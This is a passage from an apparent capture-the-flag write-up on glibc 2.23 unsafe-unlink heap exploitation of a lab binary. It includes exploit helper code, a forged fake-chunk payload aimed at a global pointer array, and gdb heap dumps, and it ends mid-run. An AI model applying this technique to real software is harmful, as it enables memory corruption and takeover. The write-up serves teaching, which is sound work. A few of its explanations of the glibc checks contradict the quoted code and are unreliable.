</span></span><span class="line"><span class="cl"><span class="nf">You</span> <span class="no">can</span> <span class="no">find</span> <span class="no">the</span> <span class="no">source</span> <span class="no">of</span> <span class="no">the</span> <span class="no">unlink</span> <span class="no">macro</span> <span class="no">at</span> <span class="no">https</span><span class="p">:</span><span class="c1">//sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nf">v</span>
</span></span><span class="line"><span class="cl"><span class="nf">At</span> <span class="no">this</span> <span class="no">point</span> <span class="no">we</span> <span class="no">can</span> <span class="no">use</span> <span class="no">chunk0_ptr</span> <span class="no">to</span> <span class="no">overwrite</span> <span class="no">itself</span> <span class="no">to</span> <span class="no">point</span> <span class="no">to</span> <span class="no">an</span> <span class="no">arbitrary</span> <span class="no">location.</span>
</span></span><span class="line"><span class="cl"><span class="nf">chunk0_ptr</span> <span class="no">is</span> <span class="no">now</span> <span class="no">pointing</span> <span class="no">where</span> <span class="no">we</span> <span class="no">want</span><span class="p">,</span> <span class="no">we</span> <span class="no">use</span> <span class="no">it</span> <span class="no">to</span> <span class="no">overwrite</span> <span class="no">our</span> <span class="no">victim</span> <span class="no">string.</span>
</span></span><span class="line"><span class="cl"><span class="nf">Original</span> <span class="no">value</span><span class="p">:</span> <span class="no">Hello</span><span class="p">!</span><span class="err">~</span>
</span></span><span class="line"><span class="cl"><span class="nf">New</span> <span class="no">Value</span><span class="p">:</span> <span class="no">BBBBAAAA</span>
</span></span></code></pre></div><p>The binary speak for itself, but let&rsquo;s see, first of all we have a global array which contains the pointers to the allocated memory regions stored in the heap. Here, we have the global pointer stored at <code>0x602070</code> stored in the BSS region, now according to the example, it is pointing to the <code>0x12ee010</code> which is the first allocated chunk, next the victim chunk here is <code>0x12ee0a0</code>, when the example says it creates a fake chunk withing the <code>chunk0</code> it means we are creating a fake <code>free</code>&rsquo;d chunk, which looks like:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">    <span class="nf">chunk-</span><span class="err">&gt;</span> <span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span>
</span></span><span class="line"><span class="cl">	    <span class="err">|</span>             <span class="nf">Size</span> <span class="no">of</span> <span class="no">previous</span> <span class="no">chunk</span>                            <span class="err">|</span>
</span></span><span class="line"><span class="cl">	    <span class="err">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span>
</span></span><span class="line"><span class="cl">    <span class="err">`</span><span class="nl">head:</span><span class="err">&#39;</span> <span class="err">|</span>             <span class="nf">Size</span> <span class="no">of</span> <span class="no">chunk</span><span class="p">,</span> <span class="no">in</span> <span class="no">bytes</span>                         <span class="err">|</span><span class="no">P</span><span class="err">|</span>
</span></span><span class="line"><span class="cl">      <span class="nf">mem-</span><span class="err">&gt;</span> <span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span>
</span></span><span class="line"><span class="cl">	    <span class="err">|</span>             <span class="nf">Forward</span> <span class="no">pointer</span> <span class="no">to</span> <span class="no">next</span> <span class="no">chunk</span> <span class="no">in</span> <span class="no">list</span>             <span class="err">|</span>
</span></span><span class="line"><span class="cl">	    <span class="err">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span>
</span></span><span class="line"><span class="cl">	    <span class="err">|</span>             <span class="nf">Back</span> <span class="no">pointer</span> <span class="no">to</span> <span class="no">previous</span> <span class="no">chunk</span> <span class="no">in</span> <span class="no">list</span>            <span class="err">|</span>
</span></span><span class="line"><span class="cl">	    <span class="err">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span>
</span></span><span class="line"><span class="cl">	    <span class="err">|</span>             <span class="nf">Unused</span> <span class="no">space</span> <span class="p">(</span><span class="no">may</span> <span class="no">be</span> <span class="mi">0</span> <span class="no">bytes</span> <span class="no">long</span><span class="p">)</span>                <span class="p">.</span>
</span></span><span class="line"><span class="cl">	    <span class="err">.</span>                                                               <span class="err">.</span>
</span></span><span class="line"><span class="cl">	    <span class="err">.</span>                                                               <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="nf">nextchunk-</span><span class="err">&gt;</span> <span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span><span class="p">-</span><span class="err">+</span>
</span></span><span class="line"><span class="cl">    <span class="err">`</span><span class="nl">foot:</span><span class="err">&#39;</span> <span class="err">|</span>             <span class="nf">Size</span> <span class="no">of</span> <span class="no">chunk</span><span class="p">,</span> <span class="no">in</span> <span class="no">bytes</span>                           <span class="err">|</span>
</span></span><span class="line"><span class="cl">	    <span class="err">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span>
</span></span></code></pre></div><p>We create a fake chunk where the <code>fd</code> pointer points to the <code>0x602058</code> and the <code>bk</code> pointer points to the <code>0x602060</code>, as mentioned the example assumes we have overflow to manipulate the metadata of chunk i.e. <code>prev_size</code> and <code>size</code> or even <code>fd</code> or <code>bk</code>, in the example it clears out the <code>PREV_IN_USE</code> which is responsible for indicating if the chunk is in use or not by the program in one way or another. So, after that when we free the chunk we clear the <code>PREV_IN_USE</code> bit off, since we added a fake in the chunk before that, the heap manager will try to unlink the free&rsquo;d chunk to make the heap more efficient for the next allocation. In the GLIBC-2.23 has the unlink mechanism as follows:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">    <span class="cm">/* consolidate backward */</span>
</span></span><span class="line"><span class="cl">    <span class="nf">if</span> <span class="p">(!</span><span class="no">prev_inuse</span><span class="p">(</span><span class="no">p</span><span class="p">))</span> <span class="err">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">prevsize</span> <span class="err">=</span> <span class="no">p-</span><span class="err">&gt;</span><span class="no">prev_size</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">size</span> <span class="err">+=</span> <span class="no">prevsize</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">p</span> <span class="err">=</span> <span class="no">chunk_at_offset</span><span class="p">(</span><span class="no">p</span><span class="p">,</span> <span class="p">-((</span><span class="no">long</span><span class="p">)</span> <span class="no">prevsize</span><span class="p">))</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">unlink</span><span class="p">(</span><span class="no">av</span><span class="p">,</span> <span class="no">p</span><span class="p">,</span> <span class="no">bck</span><span class="p">,</span> <span class="no">fwd</span><span class="p">)</span><span class="c1">;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="err">}</span>
</span></span></code></pre></div><p>What we would be doing is the same as backward consolidation, going over this piece of the code we see that the it first checks if the <code>prev_inuse</code> is not 0, then it gets the <code>prev_size</code> from the chunk header, next it gets the  chunk offset and then calls the <code>unlink</code>, let&rsquo;s see the <code>unlink</code> snippet.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="c1">#define unlink(AV, P, BK, FD) {                                            \
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">if</span> <span class="p">(</span><span class="no">__builtin_expect</span> <span class="p">(</span><span class="no">chunksize</span><span class="p">(</span><span class="no">P</span><span class="p">)</span> <span class="p">!</span><span class="err">=</span> <span class="no">prev_size</span> <span class="p">(</span><span class="no">next_chunk</span><span class="p">(</span><span class="no">P</span><span class="p">)),</span> <span class="mi">0</span><span class="p">))</span>      <span class="err">\</span>
</span></span><span class="line"><span class="cl">      <span class="nf">malloc_printerr</span> <span class="p">(</span><span class="err">&#34;</span><span class="no">corrupted</span> <span class="no">size</span> <span class="no">vs.</span> <span class="no">prev_size</span><span class="err">&#34;</span><span class="p">)</span><span class="c1">;			      \
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">FD</span> <span class="err">=</span> <span class="no">P-</span><span class="err">&gt;</span><span class="no">fd</span><span class="c1">;								      \
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">BK</span> <span class="err">=</span> <span class="no">P-</span><span class="err">&gt;</span><span class="no">bk</span><span class="c1">;								      \
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">if</span> <span class="p">(</span><span class="no">__builtin_expect</span> <span class="p">(</span><span class="no">FD-</span><span class="err">&gt;</span><span class="no">bk</span> <span class="p">!</span><span class="err">=</span> <span class="no">P</span> <span class="err">||</span> <span class="no">BK-</span><span class="err">&gt;</span><span class="no">fd</span> <span class="p">!</span><span class="err">=</span> <span class="no">P</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>		      <span class="err">\</span>
</span></span><span class="line"><span class="cl">      <span class="nf">malloc_printerr</span> <span class="p">(</span><span class="err">&#34;</span><span class="no">corrupted</span> <span class="no">double-linked</span> <span class="no">list</span><span class="err">&#34;</span><span class="p">)</span><span class="c1">;	
</span></span></span></code></pre></div><p>To be precise, we need to get through the 2 checks to call unlink for our exploit, those checks include:-</p>
<ul>
<li>The <code>prev_size</code> should not be equal to the size of the next chunk.</li>
<li>Then the other check is <code>FD</code> here is the <code>fd</code> address pointed by our chunk and vice versa should point to the chunk itself.</li>
</ul>
<h1 id="exploitation" class="relative group">Exploitation <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#exploitation" aria-label="Anchor">#</a></span></h1><p>Theories aside, it&rsquo;s time to go into the exploitation phase, let&rsquo;s create a exploit template to interact with the service:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">roppy</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">allocate</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span> <span class="s2">&#34;2&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span> <span class="s2">&#34;3&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># exploit</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./chapter1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;chapter1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">exploit</span><span class="p">()</span>
</span></span></code></pre></div><p>So, next up, we will allocate chunks, five chunks would be good, of same size:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Created 5 chunks of size: 0x88&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x88</span><span class="p">,</span> <span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x88</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x88</span><span class="p">,</span> <span class="s2">&#34;B&#34;</span><span class="o">*</span><span class="mh">0x88</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x88</span><span class="p">,</span> <span class="s2">&#34;C&#34;</span><span class="o">*</span><span class="mh">0x88</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x88</span><span class="p">,</span> <span class="s2">&#34;D&#34;</span><span class="o">*</span><span class="mh">0x88</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mh">0x88</span><span class="p">,</span> <span class="s2">&#34;E&#34;</span><span class="o">*</span><span class="mh">0x88</span><span class="p">)</span>
</span></span></code></pre></div><p>Now, we will run the exploit and see the chunks in gdb:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">0</span> <span class="err">[08:11:04]</span> <span class="nf">vagrant@oracle</span><span class="p">(</span><span class="no">oracle</span><span class="p">)</span> <span class="no">HackTheBox</span><span class="err">&gt;</span> <span class="no">python3</span> <span class="no">chapter1.py</span> 
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="err">+</span><span class="p">]</span> <span class="no">Starting</span> <span class="no">program</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">chapter1</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">PID</span> <span class="mi">2417</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Analyzing</span> <span class="err">/</span><span class="no">media</span><span class="err">/</span><span class="no">sf_Pwning</span><span class="err">/</span><span class="no">HackTheBox</span><span class="err">/</span><span class="no">chapter1</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Analyzing</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">vagrant</span><span class="err">/</span><span class="no">tools</span><span class="err">/</span><span class="no">LibcSearcher</span><span class="err">/</span><span class="no">libc-database</span><span class="err">/</span><span class="no">db</span><span class="err">/</span><span class="no">libc6_2.23-0ubuntu10_amd64.so</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Created</span> <span class="mi">5</span> <span class="no">chunks</span> <span class="no">of</span> <span class="no">size</span><span class="p">:</span> <span class="mi">0x88</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="na">..snip..</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">heap</span> <span class="no">chunks</span>
</span></span><span class="line"><span class="cl"><span class="nf">Chunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x1945010</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x90</span><span class="p">,</span> <span class="no">flags</span><span class="err">=</span><span class="no">PREV_INUSE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="err">[0</span><span class="nf">x0000000001945010</span>     <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span> <span class="mi">41</span>    <span class="no">AAAAAAAAAAAAAAAA</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">Chunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x19450a0</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x90</span><span class="p">,</span> <span class="no">flags</span><span class="err">=</span><span class="no">PREV_INUSE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="err">[0</span><span class="nf">x00000000019450a0</span>     <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span> <span class="mi">42</span>    <span class="no">BBBBBBBBBBBBBBBB</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">Chunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x1945130</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x90</span><span class="p">,</span> <span class="no">flags</span><span class="err">=</span><span class="no">PREV_INUSE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="err">[0</span><span class="nf">x0000000001945130</span>     <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span> <span class="mi">43</span>    <span class="no">CCCCCCCCCCCCCCCC</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">Chunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x19451c0</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x90</span><span class="p">,</span> <span class="no">flags</span><span class="err">=</span><span class="no">PREV_INUSE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="err">[0</span><span class="nf">x00000000019451c0</span>     <span class="mi">44</span> <span class="mi">44</span> <span class="mi">44</span> <span class="mi">44</span> <span class="mi">44</span> <span class="mi">44</span> <span class="mi">44</span> <span class="mi">44</span> <span class="mi">44</span> <span class="mi">44</span> <span class="mi">44</span> <span class="mi">44</span> <span class="mi">44</span> <span class="mi">44</span> <span class="mi">44</span> <span class="mi">44</span>    <span class="no">DDDDDDDDDDDDDDDD</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">Chunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x1945250</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x90</span><span class="p">,</span> <span class="no">flags</span><span class="err">=</span><span class="no">PREV_INUSE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="err">[0</span><span class="nf">x0000000001945250</span>     <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span> <span class="mi">45</span>    <span class="no">EEEEEEEEEEEEEEEE</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">Chunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x19452e0</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x20d30</span><span class="p">,</span> <span class="no">flags</span><span class="err">=</span><span class="no">PREV_INUSE</span><span class="p">)</span>  <span class="err">←</span>  <span class="no">top</span> <span class="no">chunk</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="mi">10</span><span class="no">xg</span> <span class="mi">0x6020c0</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x6020c0:</span>	<span class="err">0</span><span class="nf">x0000000001945010</span>	<span class="mi">0x00000000019450a0</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x6020d0:</span>	<span class="err">0</span><span class="nf">x0000000001945130</span>	<span class="mi">0x00000000019451c0</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x6020e0:</span>	<span class="err">0</span><span class="nf">x0000000001945250</span>	<span class="mi">0x0000000000000000</span>
</span></span></code></pre></div><p>Here, we have 5 chunks on the heap with the size <code>0x90</code> and then we have a global array having the pointers of the allocated chunk. Our target is to get control of the <code>0x6020c0</code> global array, so that we can manipulate the pointers stored within to it to get r/w primitive.</p>
<p>The plan here is to forge a fake chunk, such that we can point the <code>fd</code> and <code>bk</code> to the global array, this will be done with:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Preparing a fake chunk...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">global_ptr</span> <span class="o">-</span> <span class="mh">0x18</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">global_ptr</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;X&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Fake chunk:</span><span class="se">\n</span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span><span class="p">(</span><span class="n">hexdump</span><span class="p">(</span><span class="n">payload</span><span class="p">)))</span>
</span></span></code></pre></div><p>The fake chunk, if seen visually looks like:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">-------------------------------------</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span>    <span class="err">0</span>                  <span class="err">|</span>     <span class="err">0</span>     <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">-------------------------------------</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span>          <span class="nf">global_ptr</span> <span class="p">-</span> <span class="mi">0x18</span>        <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">-------------------------------------</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span>          <span class="nf">global_ptr</span> <span class="p">-</span> <span class="mi">0x10</span>        <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">-------------------------------------</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span>                                   <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span>              <span class="nf">XXXXXXXXXX</span>           <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span>                                   <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">-------------------------------------</span>
</span></span><span class="line"><span class="cl"><span class="err">|</span>   <span class="err">0</span><span class="nf">x80</span>         <span class="err">|</span>         <span class="mi">0x90</span>     <span class="err">|</span>
</span></span><span class="line"><span class="cl"><span class="err">------------------------------------</span>
</span></span></code></pre></div><p>Now, running the exploit:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="err">0</span> <span class="err">[08:31:09]</span> <span class="nf">vagrant@oracle</span><span class="p">(</span><span class="no">oracle</span><span class="p">)</span> <span class="no">HackTheBox</span><span class="err">&gt;</span> <span class="no">python3</span> <span class="no">chapter1.py</span> 
